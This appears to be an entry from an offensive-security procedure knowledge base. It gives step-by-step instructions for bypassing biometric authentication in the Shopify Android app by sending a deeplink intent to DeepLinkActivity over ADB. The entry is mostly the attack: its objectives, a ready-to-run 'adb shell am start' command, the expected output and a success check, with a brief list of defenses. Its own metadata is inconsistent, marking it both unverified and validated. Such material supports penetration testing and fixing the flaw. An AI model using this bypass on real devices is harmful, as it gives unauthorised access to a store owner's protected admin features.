---
id: p-trigger-deeplink-bypass
tags:
  - bypass
  - deeplink
  - intent
  - android
type: procedure
tools:
  - '[[tools/ADB]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/adb-start-deeplink-products]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[T1626]]'
updated_at: '2025-12-14T17:28:36.398Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[T1626]]'
---
# Trigger-Deeplink-Intent-for-Auth-Bypass

## Summary

This procedure uses ADB to launch a deeplink intent to the Shopify app's DeepLinkActivity, bypassing biometrics authentication and granting access to protected admin features like products management.

## Description

The vulnerability stems from the app not enforcing re-authentication for deeplinks when the app is already open. By targeting com.shopify.mobile.lib.app.DeepLinkActivity with a URL like https://www.shopify.com/admin/products, the intent processes directly, exploiting the active session.

## Requirements

1. ADB connected to Android device
2. Shopify app running in background
3. USB debugging enabled

## Defense

Defensive measures and detection strategies:

- Validate all incoming intents for auth state
- Prompt biometrics on external URI handling
- Block or log suspicious ADB intents

## Objectives

1. Bypass biometrics via intent
2. Access admin/products endpoint
3. Demonstrate unauthorized feature access

## Instructions

### Step 1: Execute ADB Intent

**Context**: Send the deeplink to trigger DeepLinkActivity without auth prompt.

**Command** ([[commands/adb-start-deeplink-products]]):
```bash
adb shell am start -n com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d 'https://www.shopify.com/admin/products'
```

> This starts the activity with the data URI. Expected output: App switches to admin products view without biometrics.

### Step 2: Verify Access

**Context**: Check if protected content loads.

Manual: Observe app UI for /admin/products page.

> Success: No prompt, direct access.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[T1626]] Abuse Elevation Control Mechanism

### Sub-Techniques


## Commands Used

- [[commands/adb-start-deeplink-products]]

## Tools Used

- [[tools/ADB]]

## Tags

- bypass
- deeplink
